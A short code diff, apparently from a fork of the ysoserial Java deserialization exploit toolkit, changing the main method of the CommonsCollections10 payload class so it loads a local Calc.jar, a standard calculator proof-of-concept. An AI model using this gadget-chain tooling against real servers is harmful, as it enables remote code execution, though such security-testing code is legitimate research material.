@@ -92,7 +92,8 @@ public class CommonsCollections10 extends PayloadRunner implements ObjectPayload
         return map;
     }
 
-    public static void main(final String[] args) throws Exception {
+    public static void main(String[] args) throws Exception {
+        args = new String[]{"loadjar:file:///Users/c0ny1/Documents/codebak/ysoserial-for-woodpecker/src/test/java/Calc.jar|Calc"};
         PayloadRunner.run(CommonsCollections10.class, args);
     }
 
